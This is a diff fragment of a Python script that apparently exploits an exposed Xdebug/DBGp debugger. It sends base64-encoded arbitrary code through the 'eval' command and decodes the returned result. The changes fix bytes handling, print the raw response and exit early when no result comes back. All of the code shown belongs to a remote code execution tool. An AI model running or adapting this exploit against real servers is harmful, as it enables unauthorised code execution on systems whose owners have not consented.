@@ -1,4 +1,5 @@
 import re
+import sys
 import time
 import requests
 import argparse
@@ -23,11 +24,11 @@ def recv_xml(sock):
         if not data:
             break
 
-        eop = data.find('\x00')
+        eop = data.find(b'\x00')
         length = data[:eop]
         data = data[eop+1:]
 
-        eop = data.find('\x00')
+        eop = data.find(b'\x00')
         if eop < 0:
             continue
 
@@ -60,9 +61,11 @@ if __name__ == '__main__':
     conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
 
     data = recv_xml(conn)
+    print('[+] Recieve data: ' + data.decode())
     g = re.search(rb'<\!\[CDATA\[([a-z0-9\./\+]+)\]>', data, re.I)
     if not g:
         print('[-] No result...')
+        sys.exit(0)
 
     data = g.group(1)
     print('[+] Result: ' + base64.b64decode(data).decode())
